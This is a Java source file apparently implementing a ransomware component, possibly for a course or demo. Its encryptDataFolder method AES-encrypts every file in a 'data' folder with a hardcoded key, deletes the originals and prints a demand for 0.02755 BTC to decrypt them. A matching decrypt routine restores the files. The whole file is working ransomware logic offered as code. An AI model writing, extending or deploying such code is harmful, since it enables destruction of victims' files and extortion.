import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.PublicKey;

public class Report {
    private static final Report instance = new Report();
    public Port port;
    AESUtils aesUtils;
    File dataFolder;
    File encryptedDataFolder;

    public Report() {
        this.port = new Port();
        this.aesUtils = new AESUtils("IamADamnGoodKeyword123");
        this.dataFolder = new File("data");
        //Create Folder for encrypted data
        this.encryptedDataFolder = new File("encryptedDataFolder");
        if (!this.encryptedDataFolder.exists()) {
            try {
                Files.createDirectory(Paths.get("encryptedDataFolder"));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public static Report getInstance() {
        return instance;
    }


    private void encryptFile(File inFile) {
        byte[] encryptedBytes;
        String fileSeparator = FileSystems.getDefault().getSeparator();
        File outFile = new File(encryptedDataFolder + fileSeparator + inFile.getName() + ".mvg");
        try {
            OutputStream outputStream = new FileOutputStream(outFile);
            byte[] fileByteArray = Files.readAllBytes(inFile.toPath());
            encryptedBytes = aesUtils.encrypt(fileByteArray);
            outputStream.write(encryptedBytes);
            outputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void decryptFile(File inFile) {
        byte[] decryptedBytes;
        String fileSeparator = FileSystems.getDefault().getSeparator();
        File outFile = new File(dataFolder+ fileSeparator + inFile.getName().substring(0, inFile.getName().length() - 4));
        try {
            OutputStream outputStream = new FileOutputStream(outFile);
            byte[] fileByteArray = Files.readAllBytes(inFile.toPath());
            decryptedBytes = aesUtils.decrypt(fileByteArray);
            outputStream.write(decryptedBytes);
            outputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void encryptDataFolder() {
        File[] files = dataFolder.listFiles();
        if (files != null) {
            for (File file : files) {
                encryptFile(file);
                file.delete();
            }
        }
        System.out.println("---------------------------------");
        System.out.println("„Oops, your files have been encrypted. With a payment of 0.02755 BTC all\n" +
                "files will be decrypted.");
        System.out.println("---------------------------------");
    }

    private void decryptFolder() {
            if (encryptedDataFolder.exists()) {
                File[] files = new File(String.valueOf(encryptedDataFolder)).listFiles();
                if (files != null) {
                    for (File file : files) {
                        decryptFile(file);
                        file.delete();
                    }
                }
                encryptedDataFolder.delete();
            }
        }

    public class Port implements IReport {

        public void encrypt() {
            String directoryName =  this.getClass().getClassLoader().getResource("").getPath();
            encryptDataFolder();
        }

        public void decrypt() {
            decryptFolder();
        }

    }
}
